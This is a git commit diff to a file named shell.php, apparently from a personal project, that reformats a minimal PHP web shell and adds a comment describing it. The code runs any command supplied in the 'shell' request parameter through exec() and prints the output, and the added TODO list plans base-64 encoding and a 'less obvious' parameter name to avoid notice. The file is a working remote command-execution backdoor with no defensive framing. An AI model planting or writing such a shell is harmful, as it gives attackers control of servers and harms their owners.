ab46fa5c663af7dad6affa2790728aa9db2cf057
cheddar <jmg2967@rit.edu>
2014-01-06 19:37:57 -0500

    commented with TODO

--- shell.php
+++ shell.php
@@ -1,7 +1,12 @@
 <?php
-$cmd = $_REQUEST["shell"];
-exec($cmd, $out);
-foreach ($out as $line){
-	echo "$line <br>";
-}
+/* Super basic PHP command shell.
+       TODO
+       - Base-64 decoding
+       - Change the "shell" variable to... something else... less obvious
+*/
+     $cmd = $_REQUEST["shell"];
+     exec($cmd, $out);
+     foreach ($out as $line){
+          echo "$line <br>";
+     }
 ?>
